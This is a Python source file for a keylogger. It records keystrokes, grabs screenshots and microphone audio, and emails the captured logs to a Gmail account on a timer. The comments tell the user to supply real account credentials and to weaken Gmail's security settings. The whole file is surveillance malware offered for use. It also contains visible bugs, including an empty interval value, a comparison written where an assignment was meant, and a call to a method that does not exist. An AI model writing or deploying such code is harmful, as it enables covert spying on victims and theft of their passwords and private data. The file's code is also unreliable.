import keyboard #to controle keylogs
import smtplib # to send information to ur email (gmail)
from threading import Timer
from datetime import datetime
import wave
import pynput
from pynput.keyboard import Key, Listener
import pyscreenshot # to enable screenshot commands
import sounddevice as sd #to enable voice record  commands
Send_Report_Every = () # put the time that u want , unit is (s)
Email_Address = "exampel@gmail.com" # put ur gmail here (a true one)
Email_Password = "********" # put ur password here (a true one)
# note: u need to disactivate "Less secure app access" in the acc gmail that we want to recive on it the reports and turn turn the verification off

class my_keylogger :
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        self.filename = ""
        def on_key_press(key):
            with open(f"{self.filename}.txt","a") as f:
                f.write(str(key))
            with Listener(on_press=on_key_press,) as listener:
                listener.join()
    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name == "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
                self.log += name
    def update_filename(self): # this option for creating a file for our keylogs
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
    def microphone(self):
        fs = 44100
        seconds = Send_Report_Every
        obj = wave.open('sound.wav', 'w')
        obj.setnchannels(1)  # mono
        obj.setsampwidth(2)
        obj.setframerate(fs)
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        obj.writeframesraw(myrecording)
        sd.wait()
    def screenshot(self):
        img = pyscreenshot.grab()
        self.send_mail(email=Email_Address, password=Email_Password, message=img)


    def report_to_file(self):
        with open(f"{self.filename}.txt","a") as f:
            print(self.log, file=f)
            print(f"[+] Saved {self.filename}XxTwiniTwinixX.txt")
    def sendmail(self, email, password, message):
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()
    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
        if self.report_method == "email":
            self.sendmail(Email_Address, Email_Password, self.log)
        elif self.report_method == "file":
            self.report_to_file()
            print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()
    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()
if __name__ == "__main__":
    keylogger = my_keylogger(interval=Send_Report_Every, report_method="file")
    keylogger.start()